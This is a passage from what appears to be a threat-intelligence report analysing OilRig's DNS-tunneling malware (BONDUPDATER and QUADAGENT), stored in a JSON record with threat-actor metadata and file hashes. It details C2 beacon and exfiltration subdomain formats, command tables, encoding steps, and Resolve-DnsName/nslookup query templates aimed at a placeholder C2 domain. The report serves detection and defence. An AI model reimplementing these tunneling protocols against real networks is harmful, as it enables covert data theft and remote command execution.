of](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/)\nBONDUPDATER used DNS A record queries for its DNS tunnel using the “GetHostAddresses”\nmethod in the System.Net.Dns class. The later variant of BONDUPDATER relied on raw sockets\nprovided by the System.Net.Sockets.UdpClient class to issue both DNS A and TXT lookups to\nfacilitate the DNS tunnel. The use of multiple DNS query types makes the two BONDUPDATER\nvariants dramatically different, so we will describe each separately.\n\n## Early BONDUPDATER\n\nThe initial BONDUPDATER samples used DNS A queries exclusively to set up its communication\ntunnel with its C2 server. Depending on the sample, the subdomains generated by this variant of\nBONDUPDATER would differ slightly, but the overall purpose of this variant of BONDUPDATER is to\nuse a DNS tunnel to download a new PowerShell and/or VBScript script from the C2 to execute.\n\nThe initial BONDUPDATER variant issues a beacon in the form of a DNS A request to the C2 server.\nTo build this beacon, the Trojan will create a subdomain that contains a random number, a sequence\nnumber and a unique system identifier. The Trojan will first create a unique system identifier by\nexecuting the “whoami” command and using the first 12-characters of output as the identifier. The\nsequence number in the subdomain allows the Trojan to notify the C2 the offset within the data that it\nis requesting, which is “000” for the initial beacon. The Trojan uses the following structure for the\ninitial beacon:\n\n<random number between 10-99, 1-6 digits worth><action value, “0” for beacon><sequence\nnumber><unique system identifier>B007.<C2 domain>\n\nIf the C2 wishes to send data to the Trojan, it will respond with an IPv4 address within the answer\nthat starts with “24.125” as the first two octets. The Trojan will treat the remaining two octets as\ncharacters that it will use as a filename to save the data provided by the C2. The Trojan will use the\nlast character of the filename to determine how to handle the data provided by the C2. Table 4 shows\nthe three values the Trojan will look for as the last digit of the filename (fourth octet of response to the\nbeacon) and how the Trojan will handle the received data.\n\n\n-----\n\n**Last digit in Filename** **Description**\n\n0 Treat data as PowerShell commands to execute\n\n1 Write data to <filename>.ps1\n\n2 Write data to <filename>.vbs\n\n_Table 4. Commands run based on the trailing character in the filename_\n\nFigure 22 shows the C2 responding with “24.125.0[.]1”, which instructs BONDUPDATER to create a\nfile named “01.ps1” to save the data. If the C2 wishes to terminate the Trojan, it would respond to the\nbeacon with an IPv4 answer of “11.24.237[.]110”.\n\n_Figure 22. Original BONDUPDATER beacon and the C2 server responding with a filename and data_\n_within the IPv4 answers_\n\nOnce it creates the file, BONDUPDATER will begin sending DNS queries to request IPv4 answers\nthat it will treat as data. The Trojan will use the same query structure as the beacon, but will use an\naction value of “1” and begin incrementing the sequence number in the subdomain by 3 upon each\nrequest for data. The sequence number corresponds to the offset of the data that the C2 server will\nsend, which it will transmit three bytes at a time within the first, second and third octets of the IPv4\naddress. The C2 will provide the current sequence number within the fourth octet of the IPv4\naddress, which echoes the sequence number back to the Trojan to confirm it is the correct data\nchunk. Figure 22 also shows the C2 providing IP addresses as answers to next two queries with the\nfirst three octets as data and the fourth octet as the sequence number, which the Trojan would save\n“whoami” to the “01.ps1” file.\n\nIf the Trojan successfully downloads the data from the C2 server, it crafts another subdomain that it\nwill query to notify the C2 of the successful data transfer. This subdomain is interesting as it includes\nthe system specific identifier from the beacon, but also includes up to 25-bytes of hexadecimal bytes\nof the output from the “whoami” command that was used to craft the unique system identifier. We\nbelieve that BONDUPDATER would use this structure to transmit data back to the C2 server if\ndesired. The subdomain built for the notification query has the following structure:\n\n<random number between 10-99, 5-10 digits worth>4<sequence number, always “000”><unique\nsystem identifier>B007.<25-bytes of hexlified ‘whoami’ output>.<C2 domain>\n\nFigure 23 shows BONDUPDATER notifying the C2 that it downloaded the data, but the figure also\nshows how the queries would look for data exfiltration.\n\n\n-----\n\n_Figure 23. BONDUPDATER sending data to the C2_\n\nThe BONDUPDATER Trojan does not run the downloaded PowerShell or VBScript files, instead it\nrelies on the C2 responding to a subsequent beacon with an IPv4 within the answer that starts with\n“24.125” and the fourth octet containing a “0”. According to Table 4, BONDUPDATER would treat the\ndownloaded data as a PowerShell command, which would allow the actor to run previously\ndownloaded PowerShell and/or VBScript files.\n\n## Updated BONDUPDATER\n\n[The updated BONDUPDATER that OilRig used in a 2018 attack on a Middle Eastern government](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/)\norganization had the same DNS tunneling protocol as the previously described variant, however, it\ncould also use a different tunneling protocol that used a combination of DNS A and TXT queries for\ndata transfer.\n\nThe updated BONDUPDATER uses the same DNS tunneling protocol using DNS A queries,\nspecifically looking for an IPv4 address starting with “24.125” to get the filename to save the data to\nand “11.24.237.110” if the C2 wishes to terminate the Trojan. The updated BONDUPDATER also\nlooks for an IPv4 address of “99.250.250.199”, which instructs the Trojan to begin using the alternate\nDNS tunnel that issues DNS TXT queries to transfer data.\n\nRegardless of which DNS tunneling protocol the Trojan uses, the subdomains crafted have a\ndifferent structure from the previously known variant. As mentioned in our previous blog:\n\n_\"The format of the generated domains for both sending and receiving starts with the previously_\n_generated GUID created to uniquely identify the system. However, the Trojan inserts a part number_\n_value and an action type character into this GUID string at random offsets. The part number value is_\n_a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit. The_\n_action type is a single character that notifies the C2 the type of communication the Trojan is carrying_\n_out. The two static characters “C” and “T” in the subdomain surround two digits, which help the C2_\n_server find the part number and action type mixed in within the GUID string at random offsets.\"_\n\nThe structure of the subdomains previously described is as follows, with the indexes for the part\nnumber and action representing a zero-based indexed string (0 is the first character of the string):\n\n<GUID with part number and action character><sequence number><between 1 and 7 random\ncharacters>C<index of part number><index of action>T.<C2 domain>\n\nThe initial beacon from the Trojan to the C2 uses an action type of “M” and a part number of “000”, as\nthe Trojan is not attempting to transmit any data. Figure 24 shows an example beacon sent from the\nBONDUPDATER to its C2 server, with the part number “000” at offset 7 and the action “M” at offset 4.\nIt is important to note that if the index of the action is larger than the index of the part number, then\nthe location of the action will be incorrect and will need the length of the part number (3) added to it\nto find the correct offset.\n\n\n-----\n\n_Figure 24. Updated BONDUPDATER’s initial beacon and the C2 instructing Trojan to use TXT_\n_queries_\n\nAs you can see in Figure 24, the C2 server responded to the beacon with the IPv4 address\n“99.250.250[.]199” to instruct BONDUPDATER to use the new TXT-based DNS tunnel. To obtain\ncommands from the C2 server, BONDUPDATER will request a filename from the C2 server via a\nbeacon that uses a DNS TXT query with “W” as the action value. BONDUPDATER will not only use\nthis filename to write downloaded data to, but it will also use the trailing character of the filename as\nthe command to run. Table 5 from our previous blog shows how the Trojan will use the trailing\ncharacter of the provided filename to carry out specific activities.\n\n\n**Trailing**\n**Character/Command**\n\n\n**Purpose** **Description**\n\n\n0 Execute\ncommand\n\n1 Download\nfile\n\nAny other character Upload\nfile\n\n\nReads the contents of the file and runs them as a command\nwith “cmd.exe”. The output of the command is saved to a file\nwhose name starts with “proc” and is stored in the “sendbox”\nfolder, which the Trojan will send to the C2 server.\n\nReads the contents of the file for a path to a file to download.\nCopies the specified file to a file in the “sendbox” folder for\nthe Trojan to send to the C2 server.\n\nUsed to store a file on the system. The file is moved to the\n“done” folder, which stores the file for future use. The Trojan\nwrites “200<>[path to stored file]” to a file in the “sendbox”\nfolder to notify the C2 that the file was downloaded\nsuccessfully.\n\n\n_Table 5. Commands available in BONDUPDATER and their purpose_\n\nThe C2 server will respond to this DNS TXT query with TXT answers that start with an instruction that\ntells BONDUPDATER how to process the data. Table 6 from our previous blog shows the instructions\nthat the Trojan will parse for within the TXT answer. A greater than (“>”) character will immediately\nfollow the instruction within the TXT answer, in which the Trojan will treat the characters that follow\nthe greater than character as data.\n\n**Instruction** **Description**\n\nN Idle. Set action type of next query to “W”\n\nS Receive data from C2. Decode data portion as base64. Sets the action type of future\nqueries to the C2 to “D”.\n\n\n-----\n\nS000s Use data to as a portion of the filename to save data to. The data is appended to the\nstring “rcvd”, which will be saved in the “receivebox” folder. Sets the action type of\nfuture queries to the C2 to “D”.\n\nE Write bytes provided by the “S” command to the file resulting from the “S000s”\ncommand. The breaks the loop for the script to process the downloaded file.\n\nC Cancel communications by exiting the loop.\n\n_Table 6. Instructions within the new data transfer process in BONDUPDATER and their meanings_\n\nTo execute a command on the system, the C2 would respond to the “W” TXT beacon with the\ninstruction “S000s” followed by the greater than (“>”) character and a filename that ends in a\ncharacter that ends in “0”. Figure 25 shows the BONDUPDATER issuing a request to obtain a\nfilename from the C2 server by issuing a TXT query with the “W” action at offset 3 in the subdomain.\nThe screenshot also shows the C2 responding to the query with “S000s>10100”, which tells the\nTrojan to create a file named “rcvd10100”, as the Trojan will append the provided filename to the\nstring “rcvd”.\n\n_Figure 25. BONDUPDATER requesting a filename to which to save downloaded data_\n\nWith the filename obtained, the Trojan will begin issuing DNS TXT queries with an action of “D” to\ndownload data from the C2. The C2 server will respond to these requests with an instruction of\n“S0000”, followed by the first chunk of base64 encoded data that is the command. Figure 26 shows\nBONDUPDATER issuing a TXT query with the “D” action at offset 5 and the C2 server responding\nwith the instruction of “S0000” and the encoded command of “d2hvYW1pJmlwY29uZmlnIC9hbGw=”\nfor the command “whoami&ipconfig /all”.\n\n_Figure 26. BONDUPDATER requesting data to download and the C2 providing base64 data_\n\nBONDUPDATER waits to receive an instruction from the C2 server that starts with “E” before writing\nthe downloaded data to the supplied filename. After receiving the “E” instruction, the Trojan will write\nthe base64 decoded data to the file and process the newly created file. Figure 27 shows the C2\nserver providing the “E” instruction within the TXT answer. In the current example, the Trojan would\ntreat the newly saved file as a script thanks to the filename ending with the “0” character. The Trojan\nwould run the contents of the file using “cmd.exe” and save the output to a file named “proc10100”\nthat will be uploaded to the C2 server.\n\n\n-----\n\n_Figure 27. BONDUPDATER C2 providing an instruction to tell the Trojan to write the data to the file_\n\nTo upload data to the C2 server, the updated BONDUPDATER variant will use DNS A requests to\ntransmit the data within the crafted subdomain. The structure of this subdomain differs from the DNS\nA and TXT requests meant to receive data, as these subdomains include segments for the filename\nand the data itself. To send data to the C2, the Trojan will issue DNS A queries to resolve domains\nwith the following structure:\n\n_<GUID with part number and action character of “2”><sequence number><between 1 and 7 random_\n_characters>C<index of part number><index of action>T.<data chunk>.<filename>.<c2 domain>_\n\nWhen sending data to the C2, the Trojan will include the character “2” for the action to notify the C2\nthat it is going to send data. Both the data and filename segments of the subdomain are encoded\nusing an encoding mechanism that takes the following steps:\n\n1. Creates two separate empty strings\n2. Converts each data byte to their hexadecimal form\n3. Splits each hexadecimal byte into two nibbles\n4. Appends the first nibble to the first string\n5. Appends the second nibble to the second string\n6. Concatenates the two strings together\n\nThis process effectively separates the two characters of each hexadecimal byte and spreads them\nout across the total string. The filename segment contains the encoded string for the filename with an\nasterisk (“*”) appended. For instance, the “10100” file seen in Figure 27 above will have an asterisk\nappended to it to produce “10100*”, which when encoded using this method results in a string of\n“33333210100A”. The following code block visualizes how this encoding method works:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nString to encode: 10100*\n\nChar '1' is 31 in hex.\n\n- Put '3' in string 1\n\n- Put '1' in string 2\n\nChar '0' is 30 in hex.\n\n- Put '3' in string 1\n\n- Put '0' in string 2\n\nChar '1' is 31 in hex.\n\n- Put '3' in string 1\n\n- Put '1' in string 2\n\nChar '0' is 30 in hex.\n\n- Put '3' in string 1\n\n- Put '0' in string 2\n\nChar '0' is 30 in hex.\n\n- Put '3' in string 1\n\n- Put '0' in string 2\n\nChar '*' is 2A in hex.\n\n- Put '2' in string 1\n\n- Put 'A' in string 2\n\nConcat string 1 “333332” and string 2 “10100A”\n\nEncoded string: 33333210100A\n\n\nThe data segment of the subdomain can be a maximum of 60 characters long, so BONDUPDATER\nwill split the data to exfiltrate into 30-byte chunks and encode the data using the same encoding\nmethod. To initiate the exfiltration of this file with the C2, BONDUPDATER will issue an initial DNS A\nquery for a domain whose data chunk section starts with a hardcoded “COCTab” string followed by\nan encoded string of data that contains the filename and the length of the encoded data that will be\ntransmitted. For instance, the “10100” file used in our example stored 2795 bytes of output from the\nissued command, which results in 5590 bytes when encoded. The Trojan splits the filename and data\nsize with an asterisk and uses asterisks as padding to create a 27-character string of\n“10100*5590*****************”, which results in an encoded string\n“33333233332222222222222222210100A5590AAAAAAAAAAAAAAAAA”. BONDUPDATER\nappends this encoded string to “COCTab” and issues a DNS query using this as its data segment of\n\n\n-----\n\nthe subdomain to notify the C2 how many DNS A requests it will issue to transmit the data. Figure 28\nshows the initial notification query that contains the “33333210100A” string in the filename segment\nand the data segment containing the filename and data length string after “COCTab”.\n\n_Figure 28. BONDUPDATER query notifying the C2 that it will upload the contents of a file_\n\nThe C2 server will respond to this DNS A request with an IPv4 address that contains the first two\ncharacters of the GUID used as the system identifier as the first octet, “2” and “3” as the second and\nthird octet and the fourth octet containing a sequence number corresponding to the data chunk that\nthe C2 server wishes the Trojan to send. BONDUPDATER will continue to send DNS A queries with\nchunks of encoded data from the file within the data segment of the subdomain until all of the data\nhas been transmitted. Figure 29 shows the C2 server responding to the notification query and the\nfollowing data transfer queries with the IPv4 addresses whose fourth octet increments by three to\nobtain the next chunk of data.\n\n_Figure 29. BONDUPDATER transmitting data to the C2 in the queried subdomains_\n\nAfter sending all of the data, the Trojan will issue a final DNS query with “COCTabCOCT” in the data\nsegment. This query notifies the C2 server that the Trojan has finished sending the contents of the\nfile. Figure 30 shows the continued data transfer via DNS queries, followed by the final DNS query\nwith “COCTabCOCT” within the data segment.\n\n_Figure 30. BONDUPDATER sending data and telling the C2 it is done via the \"COCTabCOCT\" string_\n\n## QUADAGENT\n\nOilRig has used the QUADAGENT tool in targeted attacks, one of which we publicly discussed in our\n[blog titled OilRig Targets Technology Service Provider and Government Agency with QUADAGENT.](https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/)\nQUADAGENT is capable of using DNS tunneling to communicate with its C2 server using DNS\nqueries to resolve custom crafted subdomains of a C2 domain. The DNS tunneling protocol uses\nAAAA queries to transmit and receive data between the infected system and its C2 server.\nDepending on the version of Windows, the payload will use a different method to issue the queries,\nspecifically:\n\n\n-----\n\n**Windows 8+**\n\nResolve-DnsName -Name <generated subdomain>.<c2 domain> -Type AAAA -DnsOnly\n\n**Windows 7**\n\nnslookup.exe -q=aaaa <generated subdomain>.<c2 domain>.\n\nIt appears that the author knew that PowerShell on Windows versions prior to Windows 8.1 did not\nhave the DnsClient module that contains the Resolve-DnsName method. At a high level,\nQUADAGENT communicates with its C2 server to obtain a PowerShell script that it will replace itself\nwith, which essentially updates the Trojan with a secondary payload. To carry out this updating\nfunctionality, QUADAGENT follows a sequence of steps that involves:\n\n1. Obtaining a session identifier and pre-shared key\n2. Confirming the correct session identifier\n3. Downloading the PowerShell script\n4. Confirming the download and execution\n\nThe first step to set up communications between QUADAGENT and the C2 involves an initial\nhandshake to obtain a session ID and pre-shared key. To obtain its session id and pre-shared key,\nthe payload will issue a query to resolve the following domain, which acts as the initial beacon:\n\nmail.<random number between 100000 and 999999>.<c2 name>\n\nThis request is to notify the C2 server that the payload is about to send system specific data as part\nof the initial handshake. The system specific data sent to the C2 server is in the following format:\n\n<domain>\\<username>:pass\n\nThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric\ncharacters (\"=\",\"/\" and \"+\") from the data and replaces them with domain safe values (\"01\", \"02\" and\n\"03\" respectively). QUADAGENT will issue a DNS query to resolve a domain with the following\nstructure to send this encoded system data to the C2:\n\n<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>\n\nThe C2 server will respond to these requests by providing a session identifier to uniquely identify the\ncompromised system and pre-shared key encrypt data sent via the DNS tunnel. To transfer this data\nto QUADAGENT, the C2 server will respond to the last DNS query with an IPv6 address that contains\na number that the Trojan will use to determine how many DNS requests it must issue to download\nthe data from the C2 server. The C2 server will send the count value in the last two hexadectets of\nthe IPv6 address in the answer to the query. Figure 31 shows QUADAGENT sending a query to\nnotify the C2 that it will send system specific data in the following query. The C2 response has “2” in\nthe last two hexadectets, which instructs the Trojan to issue two queries to download the desired\ndata.\n\n\n-----\n\n_Figure 31. Wireshark displaying beacon and transmission of system information between_\n_QUADAGENT and its C2_\n\nTo receive the data, QUADAGENT will issue DNS requests to resolve subdomains of the C2 domain\nthat start with “www” followed immediately by a sequence number of the chunk of data the Trojan\ncurrently seeks. The Trojan will issue queries to resolve the domains with the following structure until\nit has reached the count value provided by the C2 in Figure 31:\n\nwww<sequence number>.<random number between 100000 and 999999>.<c2 name>\n\nAfter obtaining the data, QUADAGENT will issue a query to resolve a subdomain structured as\nfollows to signal to the C2 server that it received all of the data:\n\nwww.<random number between 100000 and 999999>.<c2 name>\n\nFigure 32 shows QUADAGENT issuing DNS requests with incrementing sequence numbers and the\nC2 providing the session identifier and pre-shared key within the IPv6 answers. The screenshot also\nshows the Trojan sending a DNS query to notify the C2 that it successfully received the data.\n\n_Figure 32. Wireshark displaying QUADAGENT downloading a session identifier and pre-shared key_\n_from C2_\n\nQUADAGENT will then finish the handshake sequence by using its newly obtained session identifier\nin a series of queries. The Trojan will use a similar series of queries later on to exfiltrate data to the\nC2 later in its communications, but at this point in the communications QUADAGENT just uses them\nto echo the session identifier back to the C2. The payload starts this process by issuing a DNS query\nto resolve a domain with the following structure to notify the C2 that it is about to send data:\n\nns1.<new random number between 100000 and 999999>.<c2 name>\n\nQUADAGENT does nothing with the answer to the previous query, rather it immediately issues a\nquery to resolve the following domain, which effectively transmits the session id value to the C2:\n\n<session id>.<same random number between 100000 and 999999>.<c2 domain name>\n\nOnce again, the payload disregards the answer to the query above. At this point, if QUADAGENT\nhad data to the C2, it would encrypt the data and encode the ciphertext using the custom base64\nfunction used to transmit the system information within the handshake. The Trojan would then send\nthis encoded data within a sequence of queries that include 60 characters of the encoded ciphertext\n\n\n-----\n\nas the first portion of the subdomain. After completing the data transmission, QUADAGENT then\nissues one last query to resolve a domain with “ns2” as the subdomain to notify the C2 server that it\nis done sending data. At this point in the communications, QUADAGENT does not have any data to\nsend to the C2, as it is only echoing the session identifier so the Trojan issues a query to resolve a\ndomain structured as follows:\n\nns2.<same random number between 100000 and 999999>.<c2 domain name>\n\nFigure 33 shows QUADAGENT sending the provided session identifier to the C2 server.\n\n_Figure 33. Wireshark showing QUADAGENT echoing its session identifier back to the C2_\n\nTo transmit the data via the DNS tunneling channel, the C2 server will respond to the previous query\nwith an IPv6 address that contains the number of DNS queries the payload must issue to obtain the\nentirety of the data from subsequent IPv6 answers. This is the same process discussed earlier when\nthe C2 server provided the session identifier and pre-shared key. Much like the data transfer method\ndiscussed earlier, QUADAGENT will issue DNS requests to resolve subdomains “www<sequence\nnumber>” with the sequence number incrementing until it receives all the data. Once it receives all\nthe data, the Trojan issues a query to resolve “www.” to notify the C2 that it received all the data.\n\nThe C2 can respond to the query to resolve the “ns2.” domain with pipe-delimited (“|”) data that\nQUADAGENT will parse and handle in one of two ways depending on fields provided. The Trojan will\nparse the two types of data and treat them as:\n\nA new session identifier and pre-shared key\nA command to overwrite the current script with a new PowerShell script to execute\n\nFirst, the C2 can provide data with a specific structure that QUADAGENT will treat as a new session\nidentifier and pre-shared key. Much like the initial handshake, QUADAGENT will save this session\nidentifier and pre-shared key to the registry so the Trojan does not have to carry out the handshake\neach time it executes. The C2 creates a string following structure and sending it to QUADAGENT as\ncleartext via IPv6 addresses in the “www<sequence number>” query sequence:\n\n<session identifier>|<length of pre-shared key>|<pre-shared key>\n\nSecond, the C2 can provide data that QUADAGENT will treat as a command that it will parse looking\nfor data to overwrite its current file with a new PowerShell script. The C2 provides this data by\ncreating a string with the field before the first pipe (“|”) empty, the second field containing the length of\nthe ciphertext and the third field starting with the 16-byte initialization vector (IV) followed by the data\nencrypted with AES using the previously mentioned IV and the pre-shared key. This data is sent to\nthe Trojan via the “www<sequence number>” query sequence in the following format:\n\n|<length of encrypted data>|<AES IV><Data encrypted with AES and pre-shared key>\n\n\n-----\n\nFigure 34 shows the C2 server instructing QUADAGENT to issue 5 requests to download data.\nQUADAGENT issues these queries and increments the sequence number in each query. The C2\nserver provides answers to these queries with the length of the data, the 16-byte AES initialization\nvector and the data encrypted with AES using the pre-shared key.\n\n_Figure 34. Wireshark displaying QUADAGENT downloading a command from the C2 server_\n\nQUADAGENT will decrypt the data downloaded from the C2 server using AES with the provided IV\nand the previously provided pre-shared key. QUADAGENT will parse the decrypted data based on\nthe following structure:\n\nhello<char uuid[35]><char type[1]><data>\n\nThe message will start with the string 'hello', followed by a 35 character UUID string. The 'type' field\nspecifies the command that the payload will handle, which known QUADAGENT samples can only\nhandle one command type 'x'. The 'x' command treats the supplied data field as a PowerShell script\nthat it will write to the current PowerShell script, effectively overwriting the initial PowerShell script\nwith a secondary payload.\n\nThe payload will then notify the C2 that it has successfully downloaded the secondary PowerShell\npayload. The payload creates a string that has the following structure that it will send to the C2:\n\nbye<char uuid[35]>d\n\nQUADAGENT will send the above string to the C2 using the sequence of DNS queries previously\nmentioned for data exfiltration. The sequence starts by first issuing a DNS query to resolve the\nfollowing domain to notify the C2 that the payload will send data to it in subsequent DNS queries:\n\nns1.<random number between 100000 and 999999>.<c2 name>\n\nQUADAGENT will then issue a query to resolve a subdomain structured as follows, which contains\nthe session identifier that notifies the C2 which host is about to send data:\n\n<session id>.<same random number between 100000 and 999999>.<c2 domain name>\n\nThe payload will then split the message up into 60-byte chunks, which it will send to the C2 via DNS\nqueries to resolve domains structured as:\n\n<encoded/encrypted data of message>.<same random number between 100000 and 999999>.<c2\nname>\n\n\n-----\n\nThe payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a\ndomain structured as:\n\nns2.<same random number between 100000 and 999999>.<c2 name>\n\nFigure 35 shows QUADAGENT uploading data to the C2 server as base64 encoded data within the\nqueried subdomain. Before sending the data, the Trojan provides the notification query using the\n“ns1” subdomain, followed by a query with the session identifier. Finally, QUADAGENT issues a\nquery for the “ns2” subdomain to notify the C2 that it is done sending data.\n\n_Figure 35. Wireshark displaying QUADAGENT sending its \"bye\" message to the C2 server_\n\n## Conclusion\n\nThe OilRig group has repeatedly used DNS tunneling as a channel to communicate between their C2\n[servers and many of their tools. As mentioned in our overview of DNS tunneling, this threat group](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)\nsaw the benefits of using DNS tunneling, as DNS is almost universally allowed through security\ndevices. One major drawback of using DNS tunneling is the high volume of DNS queries issued to\ntransmit data back and forth between the tool and the C2 server, which may stand out to those\nmonitoring DNS activity on their networks.\n\nWhile all DNS tunneling protocols have to abide by the standardized DNS protocol, not all of the\ntunneling protocols used by OilRig are equal from an efficiency or blending in standpoint. Data\ntransmission using these DNS tunnels uses specially crafted subdomains, which can transmit more\ndata per query by designating more of the characters within the subdomain as data. It is also obvious\nthat the use of base64 encoding is more efficient than base16 in these protocols, as each character\nof base64 encoded data can send .75 bytes of data whereas base16 requires two characters to send\n1 byte. Regardless of the encoding, the extremely long subdomains used in some of these tunnels to\ntransmit data may not blend into legitimate DNS query traffic.\n\nPalo Alto Networks customers interested in protecting themselves against DNS Tunneling attacks\n[should investigate our DNS Security Service, which uses advanced techniques to identify and block](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security)\nDNS Tunneling attacks.\n\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in\nthis report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to\nrapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For\nmore information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.\n\nIOCs\n\n\n-----\n\nWhile not an exhaustive list of samples, please reference the following SHA256 hashes for the\nvarious tools discussed in this blog.\n\nHelminth\n662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f\n089bf971e8839db818ac462f53f82daed523c413bfc2e01fb76dd70b37162afe\nd808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34\n1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1\n0ec288ac8c4aa045a45526c2939dbd843391c9c75fa4a3bcc0a6d7dc692fdcd1\n3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4\nf5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e\n4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281\n\nISMAgent\na9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9\n\nALMA dash\nf37b1bbf5a07759f10e0298b861b354cee13f325bc76fbddfaacd1ea7505e111\n\nALMA dot\ne52b8b0e8225befec156b355b3022faf5617542b82aa54f9f42088aa05a4ec49\n\nBONDUPDATER Original\nde620a0511d14a2fbc9b225ebfda550973d956ab4dec7e460a42e9d2d3cf0588\n\nBONDUPDATER Updated\nd5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7\n7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00\n\nQUADAGENT\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-16 - DNS Tunneling in the Wild- Overview of OilRig’s DNS Tunneling.pdf"
    ],
    "report_names": [
        "2019-04-16 - DNS Tunneling in the Wild- Overview of OilRig’s DNS Tunneling.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e58deb93-aff1-4be5-8deb-37fe8af0b7ed",
            "created_at": "2022-10-25T16:07:23.918534Z",
            "updated_at": "2025-03-27T02:02:10.02879Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [
                "Greenbug",
                "Volatile Kitten"
            ],
            "source_name": "ETDA:Greenbug",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6bba8e81-73af-4010-86dc-d43c408ca342",
            "created_at": "2023-01-06T13:46:38.553459Z",
            "updated_at": "2025-03-27T02:00:02.860364Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [],
            "source_name": "MISPGALAXY:Greenbug",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
